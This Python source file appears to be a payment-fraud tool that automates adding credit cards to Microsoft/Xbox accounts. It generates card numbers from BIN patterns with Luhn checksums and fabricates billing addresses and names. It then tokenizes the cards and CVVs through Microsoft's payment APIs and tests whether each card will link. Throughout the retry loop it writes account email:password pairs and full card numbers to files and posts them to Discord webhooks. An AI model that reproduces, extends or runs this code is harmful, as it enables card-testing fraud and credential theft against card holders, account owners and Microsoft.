from __future__ import annotations  # for py 3.9 >= support
import base64
import hashlib
import hmac
import itertools
import json
import random
import secrets
import string
import sys
import threading
import time
import traceback
import urllib
import uuid
from typing import Union
from urllib.parse import quote_plus
import ccy
import discord_webhook.webhook
import httpx
import i18naddress
import luhn
import names
import rstr
from colr import colr
from discord_webhook import DiscordWebhook
from microsoft.services.xbox.xbox import Xbox
from util.ratelimited_bin import create_ratelimited_bins

config: dict = json.loads(open("config.json").read())
endpoint: str = config.get("endpoint")
bin_check: bool = config.get("bin-check")
bins: iter = itertools.cycle(config.get('bins').get(endpoint))


def random_string_alpha(length: int) -> str:
    return "".join(random.choices(string.ascii_lowercase, k=length))


def get_billing_address(country: str) -> dict:
    data: dict = i18naddress.load_validation_data(country).get(country)
    street_types: list = ["Ct", "St", "Road", "Pkwy", "Ln", "Lane", "Rd", "Street", "Court", "Parkway"]
    states: Union[str, None]
    region: str = random_string_alpha(4)
    if data.get("sub_isoids"):
        states = data.get('sub_isoids').split("~")
        region = random.choice(states)
        data['sub_isoids'] = states
    if data.get("languages"):
        languages: list[str] = data.get('languages').split("~")
        data['languages'] = languages
    elif data.get('sub_keys'):
        states = data.get('sub_keys').split("~")
        region = random.choice(states)
    _zip: str = data.get('zip')
    currency: str = ccy.countryccy(country)
    for i in ["id", "name", "zipex", "fmt", "posturl", "require", "sub_keys", "sub_names", "upper", "sub_zips"]:
        if data.get(i):
            del data[i]
    return {
        "extra": {
            "currency": currency if currency else "USD",  # same way ms does currency detection afaik
            "template_used": data
        },
        "billing_address": {
            "address_line1": f"{random.randint(0, 2400)} {random_string_alpha(5)} {random.choice(street_types)}",
            "country": country,
            "addressCountry": country,
            "addressType": "billing",
            "postal_code": rstr.xeger(_zip).replace(" ", "") if _zip else "1337",
            "city": random_string_alpha(5),
            "region": region,
        }
    }


def generate_cc(_bin):
    return luhn.append("".join([char.replace("x", str(random.randint(0, 9))) for char in _bin[0:15]]))


class Linker(Xbox):
    def __init__(self, email: str, password: str):
        super().__init__(email, password)
        self.address = None
        self.expy = None
        self.expm = None
        self.cvv = None
        self.card = None
        self.started = None
        self.last_bin = None
        self.key_token = None
        self.pan_token = None
        self.name = names.get_full_name()
        self.config = json.loads(open("config.json").read())
        self.endpoint = None

    def get_avail_id(self):
        return self.get_request(
            f"https://displaycatalog.mp.microsoft.com/v7/products/"
            f"{self.config.get('productId')}?languages=Nuetral&market={self.endpoint}",
            headers=self.get_options({
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,"
                          "image/webp,image/apng,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.5",
                "cache-control": "max-age=0",
                "sec-ch-ua": "\"Chromium\";v=\"112\", \"Brave\";v=\"112\", "
                             "\"Not:A-Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "none",
                "sec-fetch-user": "?1",
                "sec-gpc": "1",
                "upgrade-insecure-requests": "1",
            })
        ).json()['Product']['DisplaySkuAvailabilities'][0]['Availabilities'][0]['AvailabilityId']

    def start(self) -> tuple[str, str] | None:
        if not self.started:
            self.started = super().start()
            if self.started is None:
                return None
        try:
            return self.retry_links()
        except Exception:
            pass

    def hmac(self) -> tuple[str, str]:
        key_token = random.randbytes(64)
        key_token_b64 = base64.b64encode(key_token).decode()
        msg = f"Pan:{self.card}|HMACKey:{key_token_b64}|UserCredential:{self.auth_token}"
        return base64.b64encode(hmac.new(key_token, msg.encode(), hashlib.sha256).digest()).decode(), key_token_b64

    @staticmethod
    def rnd_str():
        return "".join(random.choices(string.ascii_lowercase, k=10))

    def set_address(self, address_dict: dict = None) -> tuple[dict, dict]:
        a = self.post_request("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/addresses", json={
            **address_dict
        }, headers=self.get_options({
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Origin": "https://www.microsoft.com",
            "Referer": "https://www.microsoft.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "Sec-GPC": "1",
            "authorization": self.auth_token,
            "content-type": "application/json",
            "correlation-context": f"v=1,ms.b.tel.scenario=commerce.payments.PaymentInstrumentAdd.1,ms.b.te"
                                   f"l.partner=XboxCom,ms.c.cfs.payments.partnerSessionId={secrets.token_urlsafe(16)}",
            "ms-cv": f"{secrets.token_urlsafe(5)}.27.3",
            "sec-ch-ua": "\"Brave\";v=\"113\", \"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "x-ms-flight": "enablePaymentMethodGrouping,EnableThreeDSOne",
            "x-ms-pidlsdk-version": "1.22.9_reactview"
        })).json()
        return address_dict, a

    def get_pan_token(self, card_number: str) -> str:
        return self.post_request("https://tokenization.cp.microsoft.com/tokens/pan/getToken", json={
            "data": card_number
        }, headers={
            "Content-Type": "application/json"
        }).json()['data']

    def get_cvv_token(self, cvv: str) -> str:
        return self.post_request("https://tokenization.cp.microsoft.com/tokens/cvv/getToken", json={
            "data": cvv
        }, headers={
            "Content-Type": "application/json"
        }).json()['data']

    def get_pi_auth_key(self, key) -> str:
        return httpx.post("https://tokenization.cp.microsoft.com/tokens/piAuthKey/getToken", json={
            "data": key
        }, headers={
            "Content-Type": "application/json",
            "authorization": self.auth_token
        }).json()['data']

    def retry_links(self) -> tuple[str, str] | None:
        tries: int = 0
        while tries < 5:
            try:
                bin_dict = next(bins)
                exp_month, exp_year = bin_dict.get("exp").replace("rndm", str(random.randint(1, 12))) \
                    .replace("rndy", str(random.randint(2025, 2038))).split("/")
                self.expm = exp_month
                self.expy = exp_year
                if len(self.expy) <= 3:
                    exp_year = f"20{self.expy}"
                    self.expy = exp_year
                self.card = generate_cc(bin_dict.get("bin"))
                billing_address_data = get_billing_address(
                    self.endpoint
                )
                self.currency = billing_address_data.get('extra').get('currency')
                billing_address = billing_address_data.get("billing_address")
                address_dict, address = self.set_address(billing_address)
                self.address = address
                self.pan_token = self.get_pan_token(self.card)
                self.cvv = self.get_cvv_token(bin_dict.get("cvv"))
                signed_token, data_token = self.hmac()
                key_token: str = self.get_pi_auth_key(data_token)
                self.last_bin = bin_dict.get("bin")
                oid = self._begin_purchase()
                card_type: str
                if self.card.startswith("4"):
                    card_type = "visa"
                else:
                    card_type = "mc"
                body = {
                    "paymentMethodFamily": "credit_card",
                    "paymentMethodType": card_type,
                    "paymentMethodOperation": "add",
                    "paymentMethodCountry": self.endpoint,
                    "paymentMethodResource_id": f"credit_card.{card_type}",
                    "sessionId": str(uuid.uuid4()),
                    "context": "purchase",
                    "riskData": {
                        "dataType": "payment_method_riskData",
                        "dataOperation": "add",
                        "dataCountry": self.endpoint,
                        "greenId": oid.get('riskId')
                    },
                    "details": {
                        "dataType": f"credit_card_{card_type}_details",
                        "dataOperation": "add",
                        "dataCountry": self.endpoint,
                        "accountHolderName": self.name,
                        "accountToken": self.pan_token,
                        "expiryMonth": exp_month,
                        "expiryYear": exp_year,
                        "cvvToken": self.cvv,
                        "address": {
                            "addressOperation": "add",
                            "addressCountry": self.endpoint,
                            "country": self.endpoint,
                            **address_dict
                        },
                        "permission": {
                            "dataType": "permission_details",
                            "dataOperation": "add",
                            "dataCountry": self.endpoint,
                            "hmac": {
                                "algorithm": "hmacsha256",
                                "keyToken": key_token,
                                "data": signed_token
                            },
                            "userCredential": self.auth_token
                        },
                        "currentContext": json.dumps({
                            "id": "credit_card.",
                            "instance": None,
                            "backupId": None,
                            "backupInstance": None,
                            "action": "addResource",
                            "paymentMethodFamily": "credit_card",
                            "paymentMethodType": None,
                            "resourceActionContext": {
                                "action": "addResource",
                                "pidlDocInfo": {
                                    "anonymousPidl": False,
                                    "resourceType": "paymentMethod",
                                    "parameters": {
                                        "type": "visa,amex,mc",
                                        "partner": "webblends",
                                        "orderId": oid.get('cartId'),
                                        "operation": "Add",
                                        "country": self.endpoint,
                                        "language": "en-US",
                                        "family": "credit_card",
                                        "completePrerequisites": "true"
                                    }
                                },
                                "pidlIdentity": None,
                                "resourceInfo": None,
                                "resourceObjPath": None,
                                "resource": None,
                                "prefillData": None
                            },
                            "partnerHints": None,
                            "prefillData": None,
                            "targetIdentity": None
                        })
                    },
                    "pxmac": self.get_pxmac()
                }
                response = self.post_request(f"https://paymentinstruments.mp.microsoft.com/v6.0/users/me/"
                                             f"paymentInstrumentsEx?country={self.endpoint}&language="
                                             f"en-US&partner=webblends&completePrerequisites=True",
                                             json=body,
                                             headers=self.get_options({
                                                 "Content-Type": "application/json",
                                                 "X-MS-PidlSDK-Version": "1.22.9_reactview",
                                                 "Correlation-Context": f"v=1,ms.b.tel.scenario=commerce.payments."
                                                                        f"PaymentInstrumentAdd.1,ms.b.tel.partner="
                                                                        f"XboxCom,ms.c.cfs.payments.partnerSession"
                                                                        f"Id={self.mscv}",
                                                 "Authorization": self.auth_token,
                                                 "MS-CV": self.mscv,
                                                 'Accept-Encoding': 'gzip, deflate, br',
                                                 'Accept-Language': 'en-US,en;q=0.5',
                                                 'Referer': 'https://www.microsoft.com/',
                                                 'Origin': 'https://www.microsoft.com',
                                                 'Sec-Fetch-Site': 'cross-site',
                                                 'Sec-Fetch-Mode': 'navigate',
                                                 'Connection': 'keep-alive',
                                                 'Sec-Fetch-Dest': 'iframe',
                                                 "x-ms-flight": "EnableThreeDSOne",
                                                 'Sec-Fetch-User': '?1'
                                             }))
                response = response.json()
                detailed_error = response.get("innererror")
                if detailed_error:
                    code = detailed_error.get("code")
                    if code == "InvalidCvv":
                        cvv_webhook = self.config.get("cvv-webhook")
                        if not cvv_webhook:
                            continue
                        discord_webhook.webhook.logger.disabled = True
                        cvv_webhook = DiscordWebhook(cvv_webhook)
                        current_time = time.strftime("%H:%M:%S", time.localtime())
                        cvv_webhook.set_content(
                            f"[{current_time}] CVV Error: `{self.email}:{self.password}` CCN: `{self.card}`")

                        try:
                            cvv_webhook.execute()
                        except Exception:
                            pass
                        sys.stdout.write(
                            f"[{colr.Colr().hex('#525052', current_time)}] "
                            f"{colr.Colr().hex('#adaaad', 'Invalid CVV')} "
                            f"{colr.Colr().hex('#BB8FCE', self.email)} "
                            f"{colr.Colr().hex('#adaaad', f'Last 4: {self.card[-4:]}')}\n")
                        sys.stdout.flush()
                        with open("accounts/cc_cvv.txt", "a+") as file:
                            file.write(self.card + "\n")
                            file.flush()
                elif response.get("id"):
                    current_time = time.strftime("%H:%M:%S", time.localtime())
                    sys.stdout.write(
                        f"[{colr.Colr().hex('#525052', current_time)}] {colr.Colr().hex('#adaaad', 'Linked')} "
                        f"{colr.Colr().hex('#fcb603', self.email)} "
                        f"{colr.Colr().hex('#adaaad', f'Last 4: {self.card[-4:]}')}\n")
                    sys.stdout.flush()

                    with open("accounts/linked.txt", 'a') as f:
                        f.write(f"{self.email}:{self.password}\n")

                    if not bin_check:
                        return response.get("id"), address.get("id")

                    with open("accounts/cc_linked.txt", "a+") as file:
                        file.write(self.card + "\n")
                        file.flush()

                    linked_webhook = self.config.get("linked-webhook")

                    if not linked_webhook:
                        return response.get("id"), address.get("id")
                    discord_webhook.webhook.logger.disabled = True
                    linked_webhook = DiscordWebhook(linked_webhook)
                    current_time = time.strftime("%H:%M:%S", time.localtime())
                    linked_webhook.set_content(
                        f"[{current_time}] Linked {self.email}:{self.password} CCN: {self.card} | {self.endpoint.upper()}")

                    try:
                        linked_webhook.execute()
                    except Exception:
                        pass
                    return response.get("id"), address.get("id")
            except Exception:
                traceback.print_exc()
                pass
            tries += 1
        return None

    def _begin_purchase(self):
        product_id = self.config.get("productId")
        sku_id = "0002"
        avail_id = self.get_avail_id()
        buy_request_data = urllib.parse.quote(json.dumps({
            "products": [{
                "productId": product_id,
                "skuId": sku_id,
                "availabilityId": avail_id
            }],
            "campaignId": "xboxcomct",
            "callerApplicationId": "XboxCom",
            "expId": [
                "EX:sc_xboxgamepad",
                "EX:sc_xboxspinner",
                "EX:sc_xboxclosebutton",
                "EX:sc_xboxuiexp",
                "EX:sc_disabledefaultstyles",
                "EX:sc_gamertaggifting"],
            "flights": [
                "sc_xboxgamepad",
                "sc_xboxspinner",
                "sc_xboxclosebutton",
                "sc_xboxuiexp",
                "sc_disabledefaultstyles",
                "sc_gamertaggifting"
            ],
            "clientType": "XboxCom",
            "data": {
                "usePurchaseSdk": True
            },
            "layout": "Modal",
            "cssOverride": "XboxCom2NewUI",
            "theme": "dark",
            "scenario": "",
            "suppressGiftThankYouPage": False
        }))
        response = self.post_request(
            f"https://www.microsoft.com/store/buynow?ms-cv={self.mscv}"
            f"&noCanonical=true&market={self.endpoint}&locale=en-US",
            headers=self.get_options({
                'Accept': 'text/html,application/xhtml+xml,'
                          'application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.5',
                'Referer': 'https://www.xbox.com/',
                'Origin': 'https://www.xbox.com',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-Mode': 'navigate',
                'Connection': 'keep-alive',
                'Sec-Fetch-Dest': 'iframe',
                'Sec-Fetch-User': '?1'
            }),
            data=f"data={buy_request_data}&"
                 f"auth={quote_plus(self.purchase_auth_token)}").text
        return {
            'cartId': response.split('"cartId":"')[1].split('"')[0],
            'riskId': response.split('"riskId":"')[1].split('"')[0]
        }

    def get_pxmac(self):
        return self.get_request(f"https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentMethodDescriptions?"
                                f"type=visa,amex,mc,discover&partner=webblends&operation=Add&country={self.endpoint}&"
                                f"language=en-US&family=credit_card&completePrerequisites=true",
                                headers=self.get_options({
                                    "Authorization": self.auth_token
                                })).json()[0]['data_description']['pxmac']['default_value']
